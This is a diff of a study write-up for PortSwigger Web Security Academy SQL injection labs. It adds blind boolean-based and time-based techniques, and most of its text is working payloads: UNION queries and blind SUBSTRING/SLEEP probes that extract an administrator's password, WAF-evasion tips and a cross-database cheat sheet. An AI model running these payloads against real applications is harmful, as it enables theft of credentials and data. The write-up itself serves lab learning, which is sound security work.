@@ -1,7 +1,7 @@
 # 🔐 SQL Injection — Write-up
 
 > PortSwigger Web Security Academy  
-> Topic: SQLi Manual Testing — Error-based & Union-based
+> Topics: SQLi Manual Testing — Error-based, Union-based, Blind Boolean-based, Blind Time-based
 
 ---
 
@@ -18,79 +18,126 @@
 | 7 | SQL injection attack, listing the database contents on non-Oracle databases | DB Enumeration | ✅ |
 | 8 | SQL injection attack, listing the database contents on Oracle | DB Enumeration | ✅ |
 | 9 | Visible error-based SQL injection | Error-based | ✅ |
+| 10 | Blind SQL injection with conditional responses | Blind Boolean-based | ✅ |
+| 11 | Blind SQL injection with conditional errors | Blind Boolean-based | ✅ |
+| 12 | Blind SQL injection with time delays | Blind Time-based | ✅ |
+| 13 | Blind SQL injection with time delays and information retrieval | Blind Time-based | ✅ |
 
 ---
 
 ## 🧠 Core Concepts
 
 ### UNION Attack
-Allows you to append an extra query to the original one and retrieve data from other tables.
-
-**Requirements:**
-- Same number of columns in both queries
-- Compatible data types in each column
+Append an extra query to the original one and retrieve data from other tables directly in the page response.
+**Requirements:** same number of columns, compatible data types.
 
 ### Error-based
-Forces the database to include retrieved data inside the error message itself, instead of returning it in the page response.
+Force the database to include retrieved data inside the error message itself.
+
+### Blind Boolean-based
+No data returned directly. Ask True/False questions and observe page behavior to infer data character by character.
+
+### Blind Time-based
+No visible difference in the page at all. Use deliberate delays as the True/False signal instead.
 
 ---
 
 ## 🚀 Payloads Used
 
-### Determining the number of columns
+### UNION — Determine number of columns
 ```sql
 ' ORDER BY 1 --
 ' ORDER BY 2 --
--- keep incrementing until an error occurs
+-- increment until error
+
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+-- increment until no error
 ```
 
-### Finding columns that accept text
+### UNION — Find text columns
 ```sql
 ' UNION SELECT 'test', NULL --
 ' UNION SELECT NULL, 'test' --
 ```
 
-### Extracting data — two columns
+### UNION — Extract data
 ```sql
--- Oracle / PostgreSQL
-' UNION SELECT NULL, username || ':' || password FROM users --
+' UNION SELECT NULL, username, password FROM users --
 
--- MySQL
-' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --
-
--- MySQL (without quotes)
-' UNION SELECT NULL, CONCAT(username, 0x3a, password) FROM users --
+-- Concatenate into one column
+' UNION SELECT NULL, username || ':' || password FROM users --        (Oracle/PostgreSQL)
+' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --    (MySQL)
+' UNION SELECT NULL, CONCAT(username, 0x3a, password) FROM users --   (MySQL - no quotes)
 ```
 
-### Querying database type and version
+### DB Enumeration
 ```sql
-' UNION SELECT NULL, @@version --              (MySQL / MSSQL)
+-- Version
+' UNION SELECT NULL, @@version --              (MySQL/MSSQL)
 ' UNION SELECT NULL, version() --              (PostgreSQL)
 ' UNION SELECT NULL, banner FROM v$version --  (Oracle)
-```
 
-### Extracting tables
-```sql
--- MySQL / PostgreSQL / MSSQL
-' UNION SELECT NULL, table_name FROM information_schema.tables --
+-- Tables
+' UNION SELECT NULL, table_name FROM information_schema.tables --         (MySQL/PostgreSQL/MSSQL)
+' UNION SELECT NULL, table_name FROM all_tables --                         (Oracle)
 
--- Oracle
-' UNION SELECT NULL, table_name FROM all_tables --
-```
-
-### Extracting columns
-```sql
--- MySQL / PostgreSQL / MSSQL
+-- Columns
 ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --
-
--- Oracle
 ' UNION SELECT NULL, column_name FROM all_columns WHERE table_name='USERS' --
 ```
 
-### Error-based on PostgreSQL
+### Error-based (PostgreSQL)
 ```sql
 ' AND 1=CAST((SELECT version()) AS int) --
 ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --
+' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int) --
+```
+
+### Blind Boolean-based — Full Flow
+```sql
+-- 1. Confirm vulnerability
+' AND '1'='1   →  page normal ✅
+' AND '1'='2   →  page changes ❌
+
+-- 2. Confirm table exists
+' AND (SELECT 'x' FROM users LIMIT 1)='x
+
+-- 3. Confirm user exists
+' AND (SELECT 'x' FROM users WHERE username='administrator')='x
+
+-- 4. Find password length
+' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>10)='x
+' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)=20)='x
+
+-- 5. Extract password (automate with Burp Intruder)
+' AND SUBSTRING(password,1,1)='a
+' AND SUBSTRING(password,2,1)='b
+```
+
+### Blind Boolean-based — Conditional Errors variant
+```sql
+-- Trigger error on TRUE, no error on FALSE
+' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a   (Oracle)
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1 --                       (MySQL/PostgreSQL)
+
+-- Extract character
+' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1 --
+```
+
+### Blind Time-based — Full Flow
+```sql
+-- 1. Confirm vulnerability
+' AND SLEEP(5) --                                           (MySQL)
+'; SELECT pg_sleep(5) --                                    (PostgreSQL)
+' WAITFOR DELAY '0:0:5' --                                  (MSSQL)
+
+-- 2. Extract data using conditional delay
+' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') 
+      THEN pg_sleep(5) ELSE pg_sleep(0) END 
+      FROM users WHERE username='administrator') --          (PostgreSQL)
+
+' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --       (MySQL)
 ```
 
 ---
@@ -99,55 +146,67 @@ Forces the database to include retrieved data inside the error message itself, i
 
 ### 1 — Using `||` for concatenation on MySQL
 ```sql
--- ❌ Failed
-' UNION SELECT NULL, username || ':' || password FROM users --
-
--- ✅ Correct for MySQL
-' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --
+-- ❌ ' UNION SELECT NULL, username || ':' || password FROM users --
+-- ✅ ' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --
 ```
-**Why:** `||` is only supported in Oracle and PostgreSQL. MySQL requires CONCAT().
-
----
+**Why:** `||` is Oracle/PostgreSQL only. MySQL requires CONCAT().
 
 ### 2 — Using `#` directly in the URL
 ```
--- ❌ Never reached the server
-/filter?category=Gifts' ORDER BY 1#
-
--- ✅ Correct
-/filter?category=Gifts' ORDER BY 1%23
+-- ❌ /filter?category=Gifts' ORDER BY 1#
+-- ✅ /filter?category=Gifts' ORDER BY 1%23
 ```
-**Why:** The browser treats `#` as a fragment identifier and strips everything after it before sending the request. URL-encode it as `%23` to pass it to the server.
-
----
+**Why:** Browser strips everything after `#`. URL-encode it as `%23`.
 
 ### 3 — Using EXTRACTVALUE on PostgreSQL
 ```sql
--- ❌ Failed
-' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
-
--- ✅ Correct for PostgreSQL
-' AND 1=CAST((SELECT version()) AS int) --
+-- ❌ ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
+-- ✅ ' AND 1=CAST((SELECT version()) AS int) --
 ```
-**Why:** EXTRACTVALUE is a MySQL-only function. PostgreSQL doesn't support it.
-
----
+**Why:** EXTRACTVALUE is MySQL only.
 
 ### 4 — Not realizing the injection point was in the Cookie
-The site wasn't responding to any URL-based injection attempts.  
-**Why:** The vulnerability was in the `TrackingId` cookie, not the URL. Burp Suite is required to intercept and modify request headers.
+**Why:** Burp Suite is required to modify cookies and headers manually.
+
+### 5 — Using AND with integer instead of boolean on PostgreSQL
+```sql
+-- ❌ ' AND CAST((SELECT version()) AS int) --
+-- ✅ ' AND 1=CAST((SELECT version()) AS int) --
+```
+**Why:** PostgreSQL requires boolean on both sides of AND.
+
+### 6 — Injecting via browser for Blind SQLi
+**Why:** Browser auto-encodes special characters. Always use Burp Repeater.
+
+### 7 — Extracting password characters manually one by one
+**Why:** Use Burp Intruder to automate across all positions and character sets.
 
 ---
 
-### 5 — Using AND with an integer instead of a boolean on PostgreSQL
-```sql
--- ❌ Error: argument of AND must be type boolean, not type integer
-' AND CAST((SELECT version()) AS int) --
+## ⚠️ Alternative Scenarios to Watch For
 
--- ✅ Correct
-' AND 1=CAST((SELECT version()) AS int) --
-```
-**Why:** PostgreSQL requires both sides of AND to evaluate to boolean. Wrapping with `1=` turns it into a boolean comparison.
+### Injection point isn't in the URL
+> Could be in a Cookie, User-Agent, Referer, or any custom header.  
+> Always check all inputs in the request, not just URL params.
+
+### Page looks identical for True/False (Boolean-based fails)
+> Switch to Time-based — use SLEEP/pg_sleep as the signal instead.
+
+### Single text column available (UNION)
+> Concatenate multiple values into one: `CONCAT(username, ':', password)`
+
+### Error messages are hidden
+> Can't use Error-based. Fall back to Blind Boolean or Time-based.
+
+### WAF blocking keywords
+> Try case mixing (`SeLeCt`), comments (`SEL/**/ECT`), or URL encoding (`%53ELECT`).
+
+### UNION returns wrong number of rows
+> The original query might return 0 rows. Make the original condition false:  
+> `?id=999 UNION SELECT NULL, username, password FROM users --`
+
+### Time-based gives inconsistent results
+> Network latency can cause false positives. Run each payload 2-3 times to confirm.
 
 ---
 
@@ -155,20 +214,59 @@ The site wasn't responding to any URL-based injection attempts.
 
 | Topic | Note |
 |---|---|
-| `--` in MySQL | Requires a space after it `-- ` or use `#` / `%23` |
-| `information_schema` | Available in all databases except Oracle |
-| Oracle | Always requires `FROM DUAL` when no table is needed |
-| LIMIT | Required with CAST to ensure only one row is returned |
-| Burp Suite | Essential for testing Cookies and Headers |
+| `--` in MySQL | Needs a trailing space `-- ` or use `%23` |
+| `information_schema` | All DBs except Oracle |
+| Oracle | Needs `FROM DUAL` when no table required |
+| LIMIT | Required with CAST — must return exactly one row |
+| Burp Repeater | Always use for manual payload testing |
+| Burp Intruder | Automate character-by-character Blind extraction |
+| Blind indicator | Look for subtle changes — text, size, status code, delay |
 
 ---
 
-## 🗺️ Syntax Comparison Across Databases
+## 🗺️ Cheat Sheet
 
-| Operation | MySQL | PostgreSQL | Oracle | MSSQL |
-|---|---|---|---|---|
-| Version | `@@version` | `version()` | `v$version` | `@@version` |
-| Concatenation | `CONCAT(a,b)` | `a \|\| b` | `a \|\| b` | `a + b` |
-| List tables | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` |
-| Comment | `-- ` or `#` | `--` | `--` | `--` |
-| Error-based | `EXTRACTVALUE` | `CAST AS int` | `CTXSYS.DRITHSX.SN` | `CONVERT` |
+### Comment Syntax
+| MySQL | PostgreSQL | Oracle | MSSQL |
+|---|---|---|---|
+| `-- ` or `#` | `--` | `--` | `--` |
+
+### Version
+| MySQL | PostgreSQL | Oracle | MSSQL |
+|---|---|---|---|
+| `@@version` | `version()` | `v$version` | `@@version` |
+
+### Concatenation
+| MySQL | PostgreSQL | Oracle | MSSQL |
+|---|---|---|---|
+| `CONCAT(a,b)` | `a \|\| b` | `a \|\| b` | `a + b` |
+
+### Substring
+| MySQL | PostgreSQL | Oracle | MSSQL |
+|---|---|---|---|
+| `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` |
+
+### Sleep / Delay
+| MySQL | PostgreSQL | Oracle | MSSQL |
+|---|---|---|---|
+| `SLEEP(5)` | `pg_sleep(5)` | `dbms_pipe.receive_message('a',5)` | `WAITFOR DELAY '0:0:5'` |
+
+### List Tables
+| MySQL/PostgreSQL/MSSQL | Oracle |
+|---|---|
+| `information_schema.tables` | `all_tables` |
+
+### List Columns
+| MySQL/PostgreSQL/MSSQL | Oracle |
+|---|---|
+| `information_schema.columns` | `all_columns` |
+
+### Error-based Technique
+| MySQL | PostgreSQL | MSSQL |
+|---|---|---|
+| `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ...)))` | `CAST((SELECT ...) AS int)` | `CONVERT(int,(SELECT ...))` |
+
+### Boolean Conditional
+| MySQL | PostgreSQL | Oracle |
+|---|---|---|
+| `IF(cond, true_val, false_val)` | `CASE WHEN cond THEN a ELSE b END` | `CASE WHEN cond THEN a ELSE b END` |
